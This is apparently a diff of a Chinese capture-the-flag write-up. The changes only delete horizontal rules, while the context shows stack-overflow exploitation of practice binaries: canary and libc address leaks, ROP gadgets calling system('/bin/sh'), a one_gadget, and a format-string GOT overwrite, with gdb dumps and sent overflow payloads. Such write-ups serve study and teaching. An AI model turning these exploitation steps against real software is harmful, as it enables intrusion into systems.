@@ -23,8 +23,6 @@ tags:
 
 首先 `checksec` 一下程序，保护全开。 ROPgadget 只能找到一个 gadget：
 
----
-
 <pre><font color="#5FD700">❯</font> <font color="#26A269">ROPgadget</font> --binary <u style="text-decoration-style:solid">./ropbasic</u> --only <font color="#A2734C">&quot;pop|ret&quot;</font>
 Gadgets information
 ============================================================
@@ -64,8 +62,6 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 根据代码知道，使用 gdb 停到 call memset 时：
 
----
-
 <pre>
 0x555555555264    <font color="#AFD700">lea</font><font color="#FFFFFF">    </font><font color="#5FD7FF">rax</font><font color="#FFFFFF">, [</font><font color="#5FD7FF">rbp</font><font color="#FFFFFF"> - </font><font color="#AF87FF">0x110</font><font color="#FFFFFF">]</font>             <font color="#C01C28"><b>RAX</b></font> =&gt; <font color="#A2734C">0x7fffffffd9f0</font> ◂— 0
 0x55555555526b    <font color="#AFD700">mov</font><font color="#FFFFFF">    </font><font color="#5FD7FF">edx</font><font color="#FFFFFF">, </font><font color="#AF87FF">0x100</font>                     <font color="#C01C28"><b>EDX</b></font> =&gt; 0x100
@@ -80,15 +76,11 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 然后查询 rdi 与 rsp 的值：
 
----
-
 <pre><font color="#C01C28">*</font><font color="#C01C28"><b>RDI </b></font> <font color="#A2734C">0x7fffffffd9f0</font> ◂— 0
 <b>RSP </b> <font color="#A2734C">0x7fffffffd9e0</font> ◂— 0
 </pre>
 
 那么， 从 rdi （0x7fffffffd9f0）开始依次读取内存数据到 rsp （0x7fffffffdb00）的位置：
-
----
 
 <pre><font color="#C01C28"><b>pwndbg&gt; </b></font>x /40gx 0x7fffffffd9f0
 <font color="#12488B">0x7fffffffd9f0</font>:	0x0000000000000000	0x0000000000000000
@@ -127,8 +119,6 @@ log.info("Canary:"+hex(Canary))
 
 运行效果如下：
 
----
-
 <pre>[<font color="#C01C28"><b>DEBUG</b></font>] Received 0x7 bytes:
     b&apos;input&gt; &apos;
 [<font color="#C01C28"><b>DEBUG</b></font>] Sent 0x109 bytes:
@@ -152,8 +142,6 @@ log.info("Canary:"+hex(Canary))
 
 首先，动态调试时（此时正在 `read()` 函数内）看到如下信息：
 
-----
-
 <pre><font color="#12488B">─────────────────────────[ BACKTRACE ]──────────────────────────</font>
  ► 0   0x55555555526b
    1   0x7ffff7c29d90
@@ -163,8 +151,6 @@ log.info("Canary:"+hex(Canary))
 因此可以判定， `0x55555555526b` （作为 `read()` 函数的返回地址）位于 `main()` 内，因此 `0x7ffff7c29d90` 就是 `main()` 函数执行完后的返回地址。
 
 注意到 `0x7ffff7c29e40` （ 相对 `0x7ffff7c29d90` 是 `0xb0`）相对于 `__libc_start_main()` 的偏移值是 `0x80` (128) ，因此可以得到 `main()` 的返回地址相对于 `__libc_start_main()` 的偏移值是 `0x30` 。通过前面栈溢出得到 `main()` 的返回地址后，我们就可以得到`__libc_start_main()` 的实际地址。 
-
-
 
 通过如下的 python 脚本，可以得到 libc 的地址：
 
@@ -192,8 +178,6 @@ log.info("libc_addr:             {:016X}".format(libc_addr))
 
 运行效果如下：
 
----
-
 <pre>[<font color="#C01C28"><b>DEBUG</b></font>] Sent 0x118 bytes:
     b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDEEFFGGHH&apos;
 [<font color="#C01C28"><b>DEBUG</b></font>] Received 0x126 bytes:
@@ -217,8 +201,6 @@ b&apos;\x90\x9d\xc2B8w\x00\x00&apos;
 已经知道了 libc 的地址，那就从 libc 里面找 gadget：`ROPgadget --binary ./libc.so.6 --only "pop|ret"` 
 
 需要找一个 rdi_ret 与一个单独的 ret  ，但是单独的 ret 空转的原因，上网说是因为**ubuntu18及以上**在**调用system函数的时候会先进行一个检测**，如果此时的**栈没有16字节对齐的话**，就会**强行把程序crash掉**，所以需要**栈对齐** ，但我并没有看懂。无论如何，在 libc 里面找到了这样两个 gadgets：
-
----
 
 <pre>0x000000000002a3e5 : pop rdi ; ret
 0x0000000000029139 : ret</pre>
@@ -300,8 +282,6 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 用 ROPgadget 一看，甚至题目本身就有一些好用的 gadget：
 
----
-
 <pre>0x00000000004011c5 : pop rdi ; ret
 0x000000000040101a : ret
 0x0000000000401181 : retf</pre>
@@ -309,8 +289,6 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 再者，用 `seccomp-tools dump` 查看，发现程序没有开启沙箱，可以考虑 get shell 了。现在要做的就是泄漏 libc 基址，然后使用 libc 的 `system(/bin/sh)` 获取 shell 控制权。
 
 同时，使用 gdb 动态调试，在 Backtrace 栏中发现
-
----
 
 <pre><font color="#12488B">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</font>
  ► 0         0x40131a main+336
@@ -413,8 +391,6 @@ IDA 反编译一下，`main()` 基本逻辑是这样的：
 
 然后就是（请求场外援助 sad 后得到的 hint） Partial RELRO ，它允许我们能够覆写 GOT 表，可不可以获取 `system` 的 GOT 表地址将其覆盖到 `main()` 要调用的一个函数在 GOT 表上的地址从而达到调用 `system("/bin/sh")` 的机会？结果也不行，一次利用 FSB 的限制不能让我做到这一点。那能不能用覆写 GOT 表从而做到无限利用 FSB ? 等等，`main()` 结束前怎么有一个 `puts("bye")` ，豁然开朗了：把 `puts_got` 变成 `main()` ，这样就让做完恶作剧的小鬼程序被狠狠脑控定身任我为非作歹 😡😡😡 ；至于 ROP 链，换成一个 one_gadget ，在这里找到的是这个：
 
----
-
 <pre><font color="#D7D7FF">0xebc85</font> execve(&quot;/bin/sh&quot;, <font color="#5FFF00">r10</font>, <font color="#5FFF00">rdx</font>)
 <font color="#FF5F5F">constraints</font>:
   address <font color="#5FFF00">rbp</font>-<font color="#D7D7FF">0x78</font> is writable
@@ -437,8 +413,6 @@ IDA 反编译一下，`main()` 基本逻辑是这样的：
 可以看到， `AAAAAAAA` ，即 `0x4141414141414141` 位于格式化字符串后的第六个偏移。
 
 使用 gdb 调试， 输入 `AAAAAAAA` 后断点在 `printf()` 内，然后看栈内容，结果如下：
-
----
 
 <pre><font color="#C01C28"><b>pwndbg&gt; </b></font>x /40gx $rsp
 <font color="#12488B">0x7fffffffdac8</font>:	0x000000000040139e	0x4141414141414141
